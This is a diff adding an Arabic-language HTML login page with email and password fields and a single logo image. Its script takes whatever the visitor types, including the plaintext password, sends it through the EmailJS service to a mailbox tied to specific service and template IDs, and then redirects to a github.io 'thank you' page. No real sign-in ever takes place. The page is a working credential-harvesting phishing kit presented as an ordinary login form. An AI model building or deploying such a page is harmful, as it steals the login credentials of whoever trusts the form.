@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج تسجيل الدخول</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        /* لضبط حجم العناصر بشكل أفضل في الشاشات الصغيرة */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box; /* يشمل الحواف والحشوة ضمن الأبعاد المحددة */
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            margin: 0;
+            height: 100vh; /* 100% من ارتفاع الصفحة */
+            display: flex;
+            justify-content: center; /* توسيط المحتوى أفقيًا */
+            align-items: flex-start; /* بدء المحتوى من الأعلى */
+            background-color: #f4f4f4;
+            padding-top: 50px; /* مسافة من الأعلى */
+        }
+
+        .form-container {
+            max-width: 400px;
+            width: 100%; /* العرض يأخذ 100% مع الحد الأقصى 400px */
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            background-color: #fff;
+            text-align: center;
+        }
+
+        .images-container {
+            display: flex;
+            justify-content: center; /* توسيط الصور أفقيًا */
+            align-items: center; /* توسيط الصور عموديًا */
+            margin-bottom: 20px;
+            height: 200px; /* يمكن تعديل هذا حسب الحاجة */
+        }
+
+        .images-container img {
+            width: 80px; /* يمكنك تعديل الحجم حسب الحاجة */
+            height: 80px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .submit-btn:hover {
+            background-color: #45a049;
+        }
+
+        /* Media Queries للتوافق مع الهواتف */
+        @media (max-width: 600px) {
+            .images-container {
+                flex-direction: column;
+                gap: 10px;
+                height: auto; /* تعديل هذا ليأخذ الارتفاع التلقائي */
+            }
+
+            .form-container {
+                padding: 15px;
+                width: 90%; /* العرض في الشاشات الصغيرة */
+            }
+
+            .input-field {
+                padding: 8px; /* تقليل حجم الحقول ليتناسب مع الهواتف */
+            }
+
+            .submit-btn {
+                padding: 8px; /* تقليل حجم الأزرار ليتناسب مع الهواتف */
+            }
+
+            h2 {
+                font-size: 1.2em; /* تقليل حجم العنوان */
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <!-- إضافة ثلاث صور مع التحكم بحجمها -->
+        <div class="images-container">
+            <img src="groob.png" alt="Image 3" style="width: 200px; height: 200px;">
+        </div>
+
+        <h2>تسجيل الدخول</h2>
+        <form id="login-form">
+            <input class="input-field" type="email" name="email" placeholder="أدخل بريدك الإلكتروني" required>
+            <input class="input-field" type="password" name="password" placeholder="أدخل كلمة السر" required>
+            <button type="submit" class="submit-btn">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <script>
+        // تهيئة EmailJS مع معرف المستخدم الخاص بك
+        (function(){
+            emailjs.init('9oG8ktWBOJBa2RwLB'); // استبدل 'your_user_id' بمعرف المستخدم الخاص بك في EmailJS
+        })();
+    
+        // التعامل مع تقديم النموذج
+        document.getElementById("login-form").addEventListener("submit", function(event){
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+    
+            var form = event.target;
+            var formData = new FormData(form);
+    
+            // إعداد البيانات لإرسالها عبر EmailJS
+            var templateParams = {
+                email: formData.get('email'),
+                password: formData.get('password'),
+            };
+    
+            // إرسال البيانات عبر EmailJS
+            emailjs.send('service_yp7nsz7', 'template_4k47gzx', templateParams)
+                .then(function(response) {
+                    alert('تم إرسال البيانات بنجاح!');
+                    // بعد عرض الرسالة، الانتقال إلى الموقع الجديد
+                    window.location.href = "https://tmam58.github.io/thank2/"; // استبدل بـ URL الصفحة التي تريد الانتقال إليها
+                }, function(error) {
+                    alert('فشل إرسال البيانات: ' + error.text);
+                });
+        });
+    </script>
+    
+</body>
+</html>
